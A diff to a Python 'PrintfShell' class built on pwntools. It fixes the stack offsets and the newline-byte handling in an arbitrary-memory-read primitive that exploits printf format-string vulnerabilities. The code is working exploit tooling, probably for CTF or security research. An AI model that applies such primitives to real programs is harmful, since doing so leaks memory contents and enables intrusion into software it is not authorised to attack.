@@ -128,7 +128,7 @@ class PrintfShell(shell.Shell):
             print("need to set the stack offset `set_offset`")
             return  
         def read_command(stack_offset):
-            command = bytes(f"%{self.stack_offset+1}$s", "ascii")
+            command = bytes(f"%{self.stack_offset+stack_offset}$s", "ascii")
             padn = (8 - len(command) % 8) % 8
             pad = b"\x00"*padn
             return command + pad
@@ -139,23 +139,24 @@ class PrintfShell(shell.Shell):
         while len(all_bytes) < n:
             suffix = pwnlib.util.packing.p64(addr + offset)
             if b"\x0a" in suffix:
-                # (1) target_address (contains 0xa's)
-                # JUNKJUNK # because newlines
-                # address of (1)
-                # format_specifier
+                # 4 (1) target_address (contains 0xa's)
+                # 3 JUNKJUNK # newlines of write
+                # 2 address of (1)
+                # 1 extra padding of format_specifier
+                # 0 format_specifier
                 locations = []
                 for i, c in enumerate(suffix):
                     if c == 0xa:
-                        locations.append((i,c))
+                        locations.append(i)
                 new_suffix = suffix.replace(b"\x0a",b"\x01")
                 # put modded suffix on stack
-                self.read_response(b"\x00"*24+new_suffix)
+                self.read_response(b"\x00"*(4*8)+new_suffix)
 
                 # replace all bytes in suffix
-                for i,c in locations:
-                    self.write_byte(self.format_location + 3*8 + i, 0xa)
-                # set command to read from the 3rd thing on stack
-                command = read_command(3)
+                for i in locations:
+                    self.write_byte(self.format_location + 4*8 + i, 0xa)
+                # set command to read from the 4th thing on stack
+                command = read_command(4)
             else:
                 command = read_command(1) + suffix
             res = self.read_response(command)
